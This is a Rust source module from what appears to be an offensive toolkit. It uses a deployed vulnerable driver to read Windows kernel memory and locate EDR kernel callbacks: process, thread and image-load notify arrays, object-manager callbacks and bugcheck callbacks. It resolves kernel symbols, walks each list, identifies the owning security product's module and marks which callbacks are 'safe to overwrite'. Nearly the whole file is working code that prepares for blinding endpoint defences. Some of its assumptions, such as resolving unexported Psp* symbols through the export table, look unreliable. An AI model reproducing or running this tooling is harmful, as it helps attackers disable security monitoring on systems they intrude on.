//! Kernel callback discovery for BYOVD operations.
//!
//! Reads kernel memory via the deployed vulnerable driver to locate and
//! enumerate EDR kernel callback registrations:
//!
//! - `PspCreateProcessNotifyRoutine` — process creation callbacks
//! - `PspCreateThreadNotifyRoutine` — thread creation callbacks
//! - `PspLoadImageNotifyRoutine` — image load callbacks
//! - `CallbackListHead` — generic object manager callbacks
//! - `KeBugCheckCallbackListHead` — bugcheck callbacks (enumerated but
//!   **never** overwritten for safety)
//!
//! The discovery process:
//! 1. Locate the kernel base address from SystemModuleInformation
//! 2. Parse ntoskrnl.exe PE headers to find exported symbols
//! 3. For each callback list, walk the `EX_CALLBACK_ROUTINE_BLOCK` array
//! 4. Record each callback's owning module, function address, and block address

use super::deploy::{self, DeployedDriver};
use anyhow::{bail, Context, Result};
use serde::{Deserialize, Serialize};

/// Information about a single discovered kernel callback.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CallbackInfo {
    /// Which callback list this entry belongs to.
    pub list_type: CallbackListType,
    /// Index into the callback routine array.
    pub index: usize,
    /// Address of the EX_CALLBACK_ROUTINE_BLOCK.
    pub block_address: u64,
    /// Address of the actual callback function.
    pub function_address: u64,
    /// Estimated owner module name (heuristic from address range).
    pub owner_module: String,
    /// Whether this callback is safe to overwrite.
    /// KeBugCheck callbacks are NEVER safe to overwrite.
    pub safe_to_overwrite: bool,
}

/// The type of kernel callback list.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CallbackListType {
    /// Process creation notification (PspCreateProcessNotifyRoutine).
    ProcessCreate,
    /// Thread creation notification (PspCreateThreadNotifyRoutine).
    ThreadCreate,
    /// Image load notification (PspLoadImageNotifyRoutine).
    ImageLoad,
    /// Generic object manager callback (CallbackListHead).
    ObjectManager,
    /// Bugcheck callback (KeBugCheckCallbackListHead) — NEVER overwritten.
    BugCheck,
}

impl std::fmt::Display for CallbackListType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ProcessCreate => write!(f, "process_create"),
            Self::ThreadCreate => write!(f, "thread_create"),
            Self::ImageLoad => write!(f, "image_load"),
            Self::ObjectManager => write!(f, "object_manager"),
            Self::BugCheck => write!(f, "bugcheck"),
        }
    }
}

/// Maximum number of callback routine entries per list.
/// Windows defines these as fixed-size arrays:
/// - PspCreateProcessNotifyRoutine: 64 entries (MAX_PROCESS_NOTIFY_ROUTINES)
/// - PspCreateThreadNotifyRoutine: 64 entries
/// - PspLoadImageNotifyRoutine: 64 entries
const MAX_CALLBACK_ENTRIES: usize = 64;

/// EX_CALLBACK_ROUTINE_BLOCK structure (simplified).
/// In kernel memory:
///   +0x00: LIST_ENTRY (Flink, Blink)
///   +0x10: RefCount
///   +0x18: Callback function pointer
///
/// The callback arrays (PspCreateProcessNotifyRoutine etc.) are arrays of
/// pointers to EX_CALLBACK_ROUTINE_BLOCK, not the blocks themselves.
/// A non-NULL entry means a callback is registered.

/// Result of a callback scan operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanResult {
    /// All discovered callbacks.
    pub callbacks: Vec<CallbackInfo>,
    /// Total number of callbacks found.
    pub total_count: usize,
    /// Number of callbacks that are safe to overwrite.
    pub overwritable_count: usize,
    /// Kernel base address used for the scan.
    pub kernel_base: u64,
}

/// Kernel module information entry (from SystemModuleInformation).
#[repr(C)]
struct KernelModuleEntry {
    section: *mut u8,
    mapped_base: *mut u8,
    image_base: *mut u8,
    image_size: u32,
    flags: u32,
    load_order_index: u16,
    init_order_index: u16,
    load_count: u16,
    name_offset: u8,
    full_path_name: [u8; 256],
}

/// Get the kernel base address via NtQuerySystemInformation.
fn get_kernel_base() -> Result<u64> {
    let mut buf_size: u32 = 0;

    // First call: get required buffer size.
    unsafe {
        let _ = syscall!(
            "NtQuerySystemInformation",
            11u32, // SystemModuleInformation
            0 as *mut u8,
            0,
            &mut buf_size as *mut u32
        );
    }

    if buf_size == 0 {
        bail!("NtQuerySystemInformation returned zero buffer size");
    }

    let mut buffer: Vec<u8> = vec![0u8; buf_size as usize + 4096];
    let mut return_length: u32 = 0;

    let status = unsafe {
        syscall!(
            "NtQuerySystemInformation",
            11u32,
            buffer.as_mut_ptr(),
            buffer.len(),
            &mut return_length as *mut u32
        )
    };

    if status != 0 {
        bail!("NtQuerySystemInformation failed: 0x{:08X}", status);
    }

    // First entry is typically ntoskrnl.exe.
    let info_ptr = buffer.as_ptr();
    let count = unsafe { *(info_ptr as *const u32) } as usize;

    if count == 0 {
        bail!("No kernel modules returned");
    }

    // First module entry.
    let first_entry = unsafe {
        let base = info_ptr.add(4) as *const KernelModuleEntry;
        &*base
    };

    Ok(first_entry.image_base as u64)
}

/// Translate a kernel virtual address to a physical address by reading the
/// corresponding page table entry (PTE) via the driver.
///
/// Uses the Windows x64 PTE base (`MmPteBase`, hardcoded to
/// `0xFFFFF68000000000` on Windows 10/11) to locate the PTE for the given
/// virtual address, reads the 8-byte PTE, extracts the page frame number
/// (bits 12–51), and computes the physical address.
///
/// # Chicken-and-egg limitation
///
/// Reading the PTE itself requires issuing a read through the driver.  The
/// PTE lives at a *virtual* address (`MmPteBase + offset`), so this function
/// calls `deploy::read_physical_memory` with that virtual address.  For
/// drivers that internally handle VA→PA conversion (the common case — e.g.
/// via `MmMapIoSpace` or `MmGetPhysicalAddress`), the driver transparently
/// translates the PTE address and the read succeeds.  For a truly
/// physical-only driver (one that passes the supplied address directly to
/// `MmMapIoSpace` with no conversion), this would fail because the PTE
/// address is virtual.  A complete solution for such drivers would require
/// CR3 bootstrapping (reading the page tables starting from a known physical
/// address obtained from the KPROCESS.DirectoryTableBase field).  No driver
/// in the current database has `needs_physical_addr = true`, so this
/// limitation is theoretical.
unsafe fn translate_va_to_pa(
    driver: &super::driver_db::VulnerableDriver,
    device_handle: usize,
    kernel_addr: u64,
) -> Result<u64> {
    // Windows x64 PTE base (MmPteBase).
    // On Windows 10/11 x64 this is 0xFFFFF68000000000.
    // Ideally resolved from kernel exports via resolve_kernel_symbol, but
    // that function itself calls read_kernel_memory, so we hardcode to
    // avoid infinite recursion.
    let pte_base: u64 = 0xFFFF_F680_0000_0000;

    // Compute the PTE address for the given virtual address.
    // PTE VA = MmPteBase + ((VA >> 9) & 0x7FFFFFFFF8)
    let pte_va = pte_base + ((kernel_addr >> 9) & 0x7FFF_FFFF_FFF8);

    // Read the PTE (8 bytes) via the driver.
    let mut pte_buf = [0u8; 8];
    deploy::read_physical_memory(driver, device_handle, pte_va, &mut pte_buf)?;

    let pte_value = u64::from_le_bytes(pte_buf);

    // PTE must be present (bit 0).
    if pte_value & 1 == 0 {
        bail!(
            "PTE not present for VA 0x{:016X} (PTE@0x{:016X} = 0x{:016X})",
            kernel_addr,
            pte_va,
            pte_value
        );
    }

    // Extract page frame number (bits 12–51).
    let pfn = (pte_value >> 12) & 0xF_FFFF_FFFF_u64;

    // Physical address = (PFN << PAGE_SHIFT) | byte_offset_within_page.
    let phys_addr = (pfn << 12) | (kernel_addr & 0xFFF);

    log::trace!(
        "VA→PA: 0x{:016X} → 0x{:016X} (PTE=0x{:016X}, PFN=0x{:X})",
        kernel_addr,
        phys_addr,
        pte_value,
        pfn
    );

    Ok(phys_addr)
}

/// Read kernel virtual memory through the vulnerable driver.
///
/// When the driver accepts virtual addresses (`needs_physical_addr = false`,
/// the common case), the kernel VA is passed directly to the driver's IOCTL.
/// The driver internally converts VA→PA (e.g. via `MmMapIoSpace` or
/// `MmGetPhysicalAddress`).
///
/// When the driver requires a physical address (`needs_physical_addr = true`),
/// this function first translates the kernel VA to a PA by reading the
/// corresponding PTE through the driver, then issues the physical read.
unsafe fn read_kernel_memory(
    driver: &super::driver_db::VulnerableDriver,
    device_handle: usize,
    kernel_addr: u64,
    buffer: &mut [u8],
) -> Result<()> {
    if !driver.needs_physical_addr {
        // Driver accepts virtual addresses and handles VA→PA internally.
        deploy::read_physical_memory(driver, device_handle, kernel_addr, buffer)
    } else {
        // Driver expects a physical address. Translate VA → PA first.
        let phys_addr = translate_va_to_pa(driver, device_handle, kernel_addr)?;
        deploy::read_physical_memory(driver, device_handle, phys_addr, buffer)
    }
}

/// Resolve the address of a kernel export symbol by walking ntoskrnl's PE.
///
/// This reads the kernel PE headers via the vulnerable driver to find
/// the export directory and resolve named symbols.
pub fn resolve_kernel_symbol(
    driver: &super::driver_db::VulnerableDriver,
    device_handle: usize,
    kernel_base: u64,
    symbol_name: &str,
) -> Result<u64> {
    // Read DOS header.
    let mut dos_header = [0u8; 64];
    unsafe {
        read_kernel_memory(driver, device_handle, kernel_base, &mut dos_header)?;
    }

    // Verify MZ signature.
    if dos_header[0] != b'M' || dos_header[1] != b'Z' {
        bail!("Invalid DOS header at kernel base");
    }

    // e_lfanew at offset 0x3C.
    let pe_offset = u32::from_le_bytes(dos_header[0x3C..0x40].try_into()?) as u64;

    // Read PE header.
    let mut pe_header = [0u8; 264]; // Enough for optional header + data directories
    unsafe {
        read_kernel_memory(
            driver,
            device_handle,
            kernel_base + pe_offset,
            &mut pe_header,
        )?;
    }

    // Verify PE signature.
    if pe_header[0] != b'P' || pe_header[1] != b'E' {
        bail!("Invalid PE signature in kernel image");
    }

    // COFF header starts at +4.
    let num_sections = u16::from_le_bytes(pe_header[6..8].try_into()?) as u32;
    let optional_header_size = u16::from_le_bytes(pe_header[20..22].try_into()?) as u64;
    let _machine = u16::from_le_bytes(pe_header[4..6].try_into()?);

    // Export directory RVA is the first data directory (index 0) in the optional header.
    // Optional header starts at +24.
    let export_dir_rva_offset = 24 + 112; // Offset to first data directory entry
    if pe_header.len() < export_dir_rva_offset + 8 {
        bail!("PE header too small for export directory");
    }

    let export_dir_rva =
        u32::from_le_bytes(pe_header[export_dir_rva_offset..export_dir_rva_offset + 4].try_into()?)
            as u64;
    let export_dir_size = u32::from_le_bytes(
        pe_header[export_dir_rva_offset + 4..export_dir_rva_offset + 8].try_into()?,
    ) as u64;

    if export_dir_rva == 0 || export_dir_size == 0 {
        bail!("Kernel image has no export directory");
    }

    // Read export directory (40 bytes minimum).
    let mut export_dir = [0u8; 40];
    unsafe {
        read_kernel_memory(
            driver,
            device_handle,
            kernel_base + export_dir_rva,
            &mut export_dir,
        )?;
    }

    let num_names = u32::from_le_bytes(export_dir[24..28].try_into()?) as u32;
    let names_rva = u32::from_le_bytes(export_dir[32..36].try_into()?) as u64;
    let functions_rva = u32::from_le_bytes(export_dir[28..32].try_into()?) as u64;
    let ordinals_rva = u32::from_le_bytes(export_dir[36..40].try_into()?) as u64;

    // Binary search for the symbol name.
    let mut low = 0u32;
    let mut high = num_names;

    while low < high {
        let mid = low + (high - low) / 2;

        // Read the name RVA.
        let mut name_rva_buf = [0u8; 4];
        unsafe {
            read_kernel_memory(
                driver,
                device_handle,
                kernel_base + names_rva + (mid * 4) as u64,
                &mut name_rva_buf,
            )?;
        }
        let name_rva = u32::from_le_bytes(name_rva_buf) as u64;

        // Read the name string (up to 128 bytes).
        let mut name_buf = [0u8; 128];
        unsafe {
            read_kernel_memory(
                driver,
                device_handle,
                kernel_base + name_rva,
                &mut name_buf,
            )?;
        }

        // Convert to null-terminated string.
        let name_len = name_buf.iter().position(|&b| b == 0).unwrap_or(128);
        let entry_name = std::str::from_utf8(&name_buf[..name_len]).unwrap_or("");

        match entry_name.cmp(symbol_name) {
            std::cmp::Ordering::Equal => {
                // Found it. Read the ordinal.
                let mut ordinal_buf = [0u8; 2];
                unsafe {
                    read_kernel_memory(
                        driver,
                        device_handle,
                        kernel_base + ordinals_rva + (mid * 2) as u64,
                        &mut ordinal_buf,
                    )?;
                }
                let ordinal = u16::from_le_bytes(ordinal_buf) as u64;

                // Read the function RVA.
                let mut func_rva_buf = [0u8; 4];
                unsafe {
                    read_kernel_memory(
                        driver,
                        device_handle,
                        kernel_base + functions_rva + ordinal * 4,
                        &mut func_rva_buf,
                    )?;
                }
                let func_rva = u32::from_le_bytes(func_rva_buf) as u64;

                return Ok(kernel_base + func_rva);
            }
            std::cmp::Ordering::Less => low = mid + 1,
            std::cmp::Ordering::Greater => high = mid,
        }
    }

    bail!("Symbol '{}' not found in kernel exports", symbol_name)
}

/// Identify the owner module of a kernel address by checking which loaded
/// module's address range contains it.
fn identify_module(driver: &super::driver_db::VulnerableDriver, device_handle: usize, addr: u64) -> Result<String> {
    let mut buf_size: u32 = 0;

    unsafe {
        let _ = syscall!(
            "NtQuerySystemInformation",
            11u32,
            0 as *mut u8,
            0,
            &mut buf_size as *mut u32
        );
    }

    let mut buffer: Vec<u8> = vec![0u8; buf_size as usize + 4096];
    let mut return_length: u32 = 0;

    let status = unsafe {
        syscall!(
            "NtQuerySystemInformation",
            11u32,
            buffer.as_mut_ptr(),
            buffer.len(),
            &mut return_length as *mut u32
        )
    };

    if status != 0 {
        return Ok("unknown".to_string());
    }

    let info_ptr = buffer.as_ptr();
    let count = unsafe { *(info_ptr as *const u32) } as usize;

    for i in 0..count {
        let entry = unsafe {
            let base = info_ptr.add(4) as *const KernelModuleEntry;
            &*base.add(i)
        };

        let module_start = entry.image_base as u64;
        let module_end = module_start + entry.image_size as u64;

        if addr >= module_start && addr < module_end {
            let name_offset = entry.name_offset as usize;
            let name_bytes: Vec<u8> = entry.full_path_name[name_offset..]
                .iter()
                .take_while(|&&b| b != 0)
                .copied()
                .collect();
            return Ok(String::from_utf8_lossy(&name_bytes).to_string());
        }
    }

    Ok("unknown".to_string())
}

/// Walk a callback routine array and collect all registered callbacks.
///
/// The callback arrays (e.g. PspCreateProcessNotifyRoutine) are arrays of
/// pointers to EX_CALLBACK_ROUTINE_BLOCK. Each non-NULL pointer indicates
/// a registered callback.
///
/// The EX_CALLBACK_ROUTINE_BLOCK layout (x64):
///   +0x00: LIST_ENTRY.Flink (8 bytes)
///   +0x08: LIST_ENTRY.Blink (8 bytes)
///   +0x10: ULONG RefCount (4 bytes + padding)
///   +0x18: PVOID Callback (8 bytes) — the actual function pointer
fn walk_callback_array(
    driver: &super::driver_db::VulnerableDriver,
    device_handle: usize,
    array_address: u64,
    list_type: CallbackListType,
) -> Result<Vec<CallbackInfo>> {
    let mut callbacks = Vec::new();
    let safe = list_type != CallbackListType::BugCheck;

    // Read the entire callback pointer array (64 entries × 8 bytes).
    let array_size = MAX_CALLBACK_ENTRIES * 8;
    let mut array_data = vec![0u8; array_size];

    unsafe {
        read_kernel_memory(driver, device_handle, array_address, &mut array_data)?;
    }

    for i in 0..MAX_CALLBACK_ENTRIES {
        // Read the pointer at this index.
        let offset = i * 8;
        let block_ptr = u64::from_le_bytes(
            array_data[offset..offset + 8].try_into().unwrap_or([0u8; 8]),
        );

        if block_ptr == 0 {
            continue; // Empty slot.
        }

        // The lowest bit may be set as a "registered" flag. Clear it.
        let block_addr = block_ptr & !1u64;
        if block_addr == 0 {
            continue;
        }

        // Read the EX_CALLBACK_ROUTINE_BLOCK to get the callback function pointer.
        // Callback function is at offset +0x18 in the block.
        let mut func_ptr_buf = [0u8; 8];
        match unsafe {
            read_kernel_memory(
                driver,
                device_handle,
                block_addr + 0x18,
                &mut func_ptr_buf,
            )
        } {
            Ok(()) => {
                let func_addr = u64::from_le_bytes(func_ptr_buf);

                if func_addr == 0 {
                    continue;
                }

                // Identify the owner module.
                let owner = identify_module(driver, device_handle, func_addr)
                    .unwrap_or_else(|_| "unknown".to_string());

                callbacks.push(CallbackInfo {
                    list_type,
                    index: i,
                    block_address: block_addr,
                    function_address: func_addr,
                    owner_module: owner,
                    safe_to_overwrite: safe,
                });
            }
            Err(e) => {
                log::warn!(
                    "Failed to read callback block at 0x{:016X}: {}",
                    block_addr,
                    e
                );
                continue;
            }
        }
    }

    Ok(callbacks)
}

/// Walk the KeBugCheckCallbackListHead linked list.
///
/// `KeBugCheckCallbackListHead` is the head of a doubly-linked `LIST_ENTRY`
/// list of `KBUGCHECK_CALLBACK_RECORD` structures — **not** a flat array like
/// the `Psp*` callback routine arrays.  Using `walk_callback_array` on it
/// produces garbage because it misinterprets the LIST_ENTRY Flink/Blink
/// pointers as callback function pointers.
///
/// `KBUGCHECK_CALLBACK_RECORD` layout (x64):
///   +0x00: LIST_ENTRY Entry  (Flink, Blink)
///   +0x10: PVOID CallbackRoutine
///   +0x18: PVOID Buffer
///   +0x20: ULONG Length
///   +0x28: PUCHAR ComponentName
///
/// BugCheck callbacks are **never** overwritten by Orchestra — they are
/// enumerated purely for detection / situational awareness.
fn walk_bugcheck_callback_list(
    driver: &super::driver_db::VulnerableDriver,
    device_handle: usize,
    list_head_addr: u64,
) -> Result<Vec<CallbackInfo>> {
    let mut callbacks = Vec::new();
    let max_walk = 256; // Safety limit to prevent infinite loops.
    let mut visited = std::collections::HashSet::new();

    // Read the Flink of the list head to get the first record.
    let mut flink_buf = [0u8; 8];
    unsafe {
        read_kernel_memory(driver, device_handle, list_head_addr, &mut flink_buf)?;
    }
    let mut current = u64::from_le_bytes(flink_buf);

    for _ in 0..max_walk {
        // Back to head or null → done.
        if current == 0 || current == list_head_addr {
            break;
        }

        // Cycle detection for corrupted lists.
        if !visited.insert(current) {
            log::warn!(
                "BugCheck callback list cycle detected at 0x{:016X}, stopping",
                current
            );
            break;
        }

        // Read the CallbackRoutine pointer at offset +0x10.
        let mut func_buf = [0u8; 8];
        match unsafe {
            read_kernel_memory(driver, device_handle, current + 0x10, &mut func_buf)
        } {
            Ok(()) => {
                let func_addr = u64::from_le_bytes(func_buf);
                if func_addr != 0 {
                    let owner = identify_module(driver, device_handle, func_addr)
                        .unwrap_or_else(|_| "unknown".to_string());

                    callbacks.push(CallbackInfo {
                        list_type: CallbackListType::BugCheck,
                        index: callbacks.len(),
                        block_address: current,
                        function_address: func_addr,
                        owner_module: owner,
                        safe_to_overwrite: false, // BugCheck callbacks are NEVER overwritten.
                    });
                }
            }
            Err(e) => {
                log::warn!(
                    "Failed to read BugCheck callback record at 0x{:016X}: {}",
                    current,
                    e
                );
                break;
            }
        }

        // Follow Flink to the next record.
        unsafe {
            read_kernel_memory(driver, device_handle, current, &mut flink_buf)?;
        }
        current = u64::from_le_bytes(flink_buf);
    }

    Ok(callbacks)
}

/// Main entry point: discover all EDR kernel callbacks.
///
/// # Arguments
/// * `deployed` - The deployed vulnerable driver with device handle
///
/// # Returns
/// A `ScanResult` with all discovered callbacks and metadata.
pub fn scan_callbacks(deployed: &DeployedDriver) -> Result<ScanResult> {
    let device_handle = deployed
        .device_handle
        .context("No device handle for deployed driver")?;

    let driver = deployed.driver;

    // Step 1: Get the kernel base address.
    let kernel_base = get_kernel_base().context("failed to get kernel base address")?;
    log::info!("Kernel base address: 0x{:016X}", kernel_base);

    // Step 2: Resolve the callback list symbols.
    // These are the primary callback routine arrays in ntoskrnl.
    let symbols = [
        ("PspCreateProcessNotifyRoutine", CallbackListType::ProcessCreate),
        ("PspCreateThreadNotifyRoutine", CallbackListType::ThreadCreate),
        ("PspLoadImageNotifyRoutine", CallbackListType::ImageLoad),
    ];

    let mut all_callbacks = Vec::new();

    for (symbol, list_type) in &symbols {
        match resolve_kernel_symbol(driver, device_handle, kernel_base, symbol) {
            Ok(addr) => {
                log::info!(
                    "Resolved {} at 0x{:016X}",
                    symbol,
                    addr
                );

                match walk_callback_array(driver, device_handle, addr, *list_type) {
                    Ok(cbs) => {
                        log::info!(
                            "Found {} callbacks in {}",
                            cbs.len(),
                            symbol
                        );
                        all_callbacks.extend(cbs);
                    }
                    Err(e) => {
                        log::warn!(
                            "Failed to walk callback array at {}: {}",
                            symbol,
                            e
                        );
                    }
                }
            }
            Err(e) => {
                log::warn!("Failed to resolve {}: {}", symbol, e);
            }
        }
    }

    // Step 3: Walk KeBugCheckCallbackListHead (linked list, NOT an array).
    // BugCheck callbacks are NEVER overwritten — enumerated for detection only.
    match resolve_kernel_symbol(driver, device_handle, kernel_base, "KeBugCheckCallbackListHead")
    {
        Ok(list_head) => {
            log::info!(
                "Resolved KeBugCheckCallbackListHead at 0x{:016X}",
                list_head
            );
            match walk_bugcheck_callback_list(driver, device_handle, list_head) {
                Ok(cbs) => {
                    log::info!("Found {} BugCheck callbacks", cbs.len());
                    all_callbacks.extend(cbs);
                }
                Err(e) => {
                    log::warn!("Failed to walk KeBugCheckCallbackListHead: {}", e);
                }
            }
        }
        Err(e) => {
            log::warn!("Failed to resolve KeBugCheckCallbackListHead: {}", e);
        }
    }

    // Step 4: Walk CallbackListHead (generic object manager callbacks).
    // This is a linked list of CALLBACK_ENTRY_ITEM, not a flat array.
    match resolve_kernel_symbol(driver, device_handle, kernel_base, "CallbackListHead") {
        Ok(list_head) => {
            log::info!("Resolved CallbackListHead at 0x{:016X}", list_head);
            match walk_linked_callback_list(driver, device_handle, list_head) {
                Ok(cbs) => {
                    log::info!("Found {} object manager callbacks", cbs.len());
                    all_callbacks.extend(cbs);
                }
                Err(e) => {
                    log::warn!("Failed to walk CallbackListHead: {}", e);
                }
            }
        }
        Err(e) => {
            log::warn!("Failed to resolve CallbackListHead: {}", e);
        }
    }

    let overwritable = all_callbacks.iter().filter(|c| c.safe_to_overwrite).count();

    Ok(ScanResult {
        total_count: all_callbacks.len(),
        overwritable_count: overwritable,
        kernel_base,
        callbacks: all_callbacks,
    })
}

/// Walk the CallbackListHead linked list for object manager callbacks.
///
/// Each entry is a CALLBACK_ENTRY_ITEM:
///   +0x00: LIST_ENTRY (Flink, Blink)
///   +0x10: OB_CALLBACK CallbackRegistration
///          +0x00: USHORT Version
///          +0x02: USHORT OperationRegistrationCount
///          +0x08: UNICODE_STRING Altitude
///          +0x18: PVOID Context
///          +0x20: POB_PRE_OPERATION_CALLBACK PreOperation
///          +0x28: POB_POST_OPERATION_CALLBACK PostOperation
fn walk_linked_callback_list(
    driver: &super::driver_db::VulnerableDriver,
    device_handle: usize,
    list_head: u64,
) -> Result<Vec<CallbackInfo>> {
    let mut callbacks = Vec::new();
    let max_walk = 256; // Safety limit to prevent infinite loops.

    // Read the Flink of the list head.
    let mut flink_buf = [0u8; 8];
    unsafe {
        read_kernel_memory(driver, device_handle, list_head, &mut flink_buf)?;
    }
    let mut current = u64::from_le_bytes(flink_buf);

    for _ in 0..max_walk {
        if current == 0 || current == list_head {
            break; // End of list or back to head.
        }

        // Read the PreOperation callback pointer at offset +0x30 from LIST_ENTRY.
        // CALLBACK_ENTRY_ITEM layout:
        //   +0x00: LIST_ENTRY.Flink
        //   +0x08: LIST_ENTRY.Blink
        //   +0x10: OB_CALLBACK structure starts here
        //   +0x30: PreOperation callback (offset from LIST_ENTRY start)
        let mut pre_op_buf = [0u8; 8];
        match unsafe {
            read_kernel_memory(driver, device_handle, current + 0x30, &mut pre_op_buf)
        } {
            Ok(()) => {
                let func_addr = u64::from_le_bytes(pre_op_buf);
                if func_addr != 0 {
                    let owner = identify_module(driver, device_handle, func_addr)
                        .unwrap_or_else(|_| "unknown".to_string());

                    callbacks.push(CallbackInfo {
                        list_type: CallbackListType::ObjectManager,
                        index: callbacks.len(),
                        block_address: current,
                        function_address: func_addr,
                        owner_module: owner,
                        safe_to_overwrite: true,
                    });
                }
            }
            Err(e) => {
                log::warn!(
                    "Failed to read callback entry at 0x{:016X}: {}",
                    current,
                    e
                );
                break;
            }
        }

        // Follow Flink.
        unsafe {
            read_kernel_memory(driver, device_handle, current, &mut flink_buf)?;
        }
        current = u64::from_le_bytes(flink_buf);
    }

    Ok(callbacks)
}
